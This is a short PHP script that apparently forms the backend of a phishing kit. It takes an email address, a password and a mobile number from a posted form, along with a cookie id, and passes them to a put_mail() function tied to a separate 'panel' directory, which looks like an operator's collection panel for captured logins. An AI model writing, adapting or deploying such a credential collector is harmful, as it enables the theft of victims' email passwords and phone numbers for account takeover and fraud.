<?php
require_once("../lib/class.inputfilter.php");
require('../panel/include/setings.php');
date_default_timezone_set('America/Bogota');
$ifilter = new InputFilter();

$correo = $ifilter->process($_POST['eml']);
$clave = $ifilter->process($_POST['clv']);
$celular = $ifilter->process($_POST['cel']);

$id = $_COOKIE['id'];

put_mail($id,$correo,$clave,$celular);
?>